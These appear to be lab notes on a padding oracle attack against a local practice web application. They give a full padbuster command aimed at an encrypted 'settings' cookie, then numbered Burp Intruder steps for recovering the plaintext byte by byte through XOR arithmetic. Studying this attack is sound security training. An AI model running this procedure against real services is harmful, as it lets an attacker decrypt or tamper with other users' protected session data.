Automated
=========

padbuster http://127.0.0.1:8080/PaddingOracle/ 'ECeYwVmC9ezQ6e3x6KqTHMIVkDT8wEMtV5y3pASQA5yNMv3v8aLufrZ8wYtgcGPs3rWdxCXDsJLUz1fIlMo8JFg3xRQiK0okv7ad3ht00Bi6stWT2leBKmLeU/jxRqaT9ulkLfcM92U1JEgHYSLxMderu6TOY9nat287P6CbWoWDr24ELQsTfpx7WTh3cIcu1FAN6l7svm/l5se1WzbgWejSA/HbtKMr+KQV/fZPbAk=' 16 -cookies 'settings=ECeYwVmC9ezQ6e3x6KqTHMIVkDT8wEMtV5y3pASQA5yNMv3v8aLufrZ8wYtgcGPs3rWdxCXDsJLUz1fIlMo8JFg3xRQiK0okv7ad3ht00Bi6stWT2leBKmLeU/jxRqaT9ulkLfcM92U1JEgHYSLxMderu6TOY9nat287P6CbWoWDr24ELQsTfpx7WTh3cIcu1FAN6l7svm/l5se1WzbgWejSA/HbtKMr+KQV/fZPbAk='


Manually
========

1. Decode Base64 String
2. Get last two blocks as ASCII HEX
    d4500dea5eecbe6fe5e6c7b55b36e059
    e8d203f1dbb4a32bf8a415fdf64f6c09
3. Intruder
    a. mark whole cookie value
    b. Number payload: 1-255, hex, 2 characters
    c. Payload processing
        a. Add Prefix: 15*nullbyte: 000000000000000000000000000000
        b. Add suffix: last block: e8d203f1dbb4a32bf8a415fdf64f6c09
        c. Decode as ascii hex
        d. Encode as base64
4. Find the payload which doesn't result in padding error
5. Calculate IV:    value ^ 0x01
6. Calculate Decrypted byte: IV ^ last byte of previous block: IV ^ 0x59
7. Remove last null byte from prefix
8. Prepend padding to suffix: IV ^ 0x02
9. Find the payload which doesn't result in padding error
10. Calculate IV for next byte: value ^ 0x02
11. Calculate Decrypted byte: IV ^ next byte of previous block: IV ^ 0xe0
12. Remove last null byte from prefix
13. Replace last prepended byte of suffix: last_IV ^ 0x03
14. Prepend padding to suffix: IV ^ 0x03
15. Find the payload which doesn't result in padding error
16. Calculate IV for next byte: value ^ 0x03
17. Calculate Decrypted byte: IV ^ next byte of previous block: IV ^ 0x36
18. Repeat until all 16 bytes are decrypted
